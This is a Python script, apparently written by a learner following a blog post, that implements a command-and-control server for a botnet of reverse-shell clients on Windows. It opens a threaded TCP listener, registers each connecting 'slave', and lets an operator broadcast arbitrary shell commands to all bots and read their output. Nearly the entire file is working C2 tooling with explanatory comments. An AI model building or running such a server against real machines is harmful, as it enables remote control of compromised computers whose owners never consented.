#!/usr/bin/python3


# learning to how to write a C2 botnet & Reverse shell executable in windows 
# credits goes to Chetan Nayak for the blog post 

import socket       #import socket library
import sys          #import system library for parsing arguments
import os           #import os library to call exit and kill threads
import threading        #import threading library to handle multiple connections
import queue            #import queue library to handle threaded data
import time

q = queue.Queue()
SocketThread = []
ClientList = {} ## why does this work with a dictionary and not an array?


# pass lhost and lport and empty queue
def listener(lhost, lport, q):
    #initialize the network socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # we can reuse the port as we will be listening from multiple connections on the same port
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # we then start listening and have a max set connection of 100
    # anything more than 100 connections is put in the Q.
    server_address = (lhost,lport)
    server.bind(server_address)
    server.listen(100)

    print("[+] Starting Bonet Listener on TCP://" +lhost +":" + str(lport) +"\n")
    # Once we get a connection, we pass the emtpy QUeue to the BoTCMD class which start a thread and prompts for commands to be sent
    # we start the thread by using .start()

    BotCMDThread = BotCmd(q)
    BotCMDThread.start()

    # the next step is to accept incoming connections and start a new thread by calling the BotHandler class
    # The value and the cound of the child threads are stored in the list SocketThread and then we start the thread
    # this process runs in a loop and keeps on accepting incoming connections till it reaches 100 or is asked to close by the parent process.
    while(True):
        (client,client_address) = server.accept()
        newThread = BotHandler(client,client_address, q)
        SocketThread.append(newThread)
        newThread.start()

class BotCmd(threading.Thread):
    def __init__(self,qv2):
        threading.Thread.__init__(self)
        self.q=qv2

    # initialize a thread uisng self and run a true loop which does 3 things
    # pass the loop if the command is recieved
    # send the commands to all bots to disconnect and exit the botnet if exit command is recieved
    # prompt for the next command once a command is parsed and sent to the bothandler thread bia the queue.

    '''
    Alays remember to reassign the arguments value to local value using self when using a thread, else it will not be able to identify an object
    the for loop, runs a count of bots connected and puts the same number of data in the queue so that it is sent to all the bots properly
    we've also used a sleep function from the time libary, because the threading of python3 is a bit buggy and sometimes it sends all data in the que to only one host
    this sleep command fixes the bug here.
    '''
    def run(self):
        while(True):
            SendCmd = str(input("BotCmd >"))
            if(SendCmd == ""):
                pass
            elif(SendCmd == "exit"):
                for i in range(len(SocketThread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)
                time.sleep(5)
                os._exit(0)
            else:
                print("[+] Sending Command: " + SendCmd + " to " + str(len(SocketThread)) + " bots ")
                for i in range(len(SocketThread)):
                    time.sleep(0.1)
                    self.q.put(SendCmd)

# This is the main class and it handles all the CPU and memory intensive workload
# we first parse the arguments recieved from the listner() function (client which contains the socket details)
# the client address and the port of the client
# finally, the qv variable which contains the queue value sent via the BotCmd() thread

class BotHandler(threading.Thread):
    def __init__(self, client, client_address, qv):
        threading.Thread.__init__(self)
        self.client = client
        self.client_address = client_address
        self.ip = client_address[0]
        self.port = client_address[1]
        self.q = qv

# As soon as the listener() passes the arguments to this thread, it assigns a name of each child process with a naming convention of type: Thread-X, with X being a number incrementing with each bot
# Once connected, the thread goes into listening mode and starts to listen to incoming commands in the queue
# As soon as a command is sent to the que via the BotCmd, it will be pulled out by the child threads/bot thread and sent to the respective bot
# We put this send part in a try, except block so that if a bot disconnects due to some reason, it will print in on the screen.

    def run(self):
        BotName = threading.current_thread().getName()
        print("[*] Slave " + self.ip + ":" + str(self.port) + " connected with Thread-ID: ", BotName)
        ClientList[BotName] = self.client_address
        while True:
            RecvBotCmd = self.q.get()
            try:
                # changes to the bothandler class so that we can recieved data and decode the recieved data
                RecvBotCmd += "\n"
                self.client.send(RecvBotCmd.encode('utf-8'))
                recvValue = (self.client.recv(1024)).decode('utf-8') # updated piece of code 
                print(recvValue)
            except Exception as ex:
                print(ex)
                break

def main():
    if(len(sys.argv)<3):
        print("[!] Usage:\n [+] python3 "+sys.argv[0]+ "<LHOST> <LPORT>\n [+] eg.: python3"+sys.argv[0]+"0.0.0.0 8080\n")
    else:
        try:
            lhost=sys.argv[1]
            lport=int(sys.argv[2])
            listener(lhost,lport,q)
        except Exception as ex:
            print("\n[-] Unable to run the handler. Reason: " + str(ex) + "\n")

if __name__=='__main__':
    main()
